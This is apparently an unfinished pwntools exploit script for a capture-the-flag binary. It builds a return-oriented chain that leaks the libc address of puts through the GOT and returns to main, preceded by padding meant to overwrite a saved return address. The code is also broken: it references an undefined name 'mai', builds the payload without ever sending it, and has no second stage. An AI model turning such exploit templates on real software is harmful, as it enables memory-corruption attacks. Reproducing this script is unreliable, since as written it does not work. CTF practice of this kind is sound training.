from pwn import *

context.log_level = 'debug'

p = process('./one')
#p = remote('',)
e = ELF('./one')
l = e.libc
#l = ELF('./')

pause()

main = 0x0804851B
rop = ROP(e)

rop.puts(e.got['puts'])
rop.raw(mai)

print rop.dump()

payload = 'a' * 0x12
payload += 'b' * 4
payload += rop.chain()

p.interactive()
